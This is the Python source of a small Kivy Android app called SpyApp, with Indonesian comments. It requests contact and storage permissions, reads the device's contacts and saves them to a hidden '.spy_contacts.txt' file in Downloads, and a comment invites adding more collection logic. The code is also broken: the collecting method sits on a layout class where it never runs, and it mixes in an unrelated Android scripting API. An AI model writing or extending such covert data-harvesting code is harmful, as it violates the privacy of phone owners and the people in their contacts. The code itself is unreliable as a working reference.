from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
import android
from android.permissions import request_permissions, Permission

class Main(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        request_permissions([Permission.READ_CONTACTS, Permission.READ_EXTERNAL_STORAGE])

    def on_start(self):
        droid = android.Android()
        # ambil data kontak
        contacts = droid.queryContent('content://contacts/people').result
        self.contacts = contacts
        # simpan di file tersembunyi
        with open('/storage/emulated/0/Download/.spy_contacts.txt', 'w') as f:
            f.write(str(contacts))
        # ambil satu gambar
        # ... (kamu bisa tambahkan logika tambahan)
        print("Data kontak disimpan tersembunyi.")

class SpyApp(App):
    def build(self):
        return Main()

if __name__ == '__main__':
    SpyApp().run()
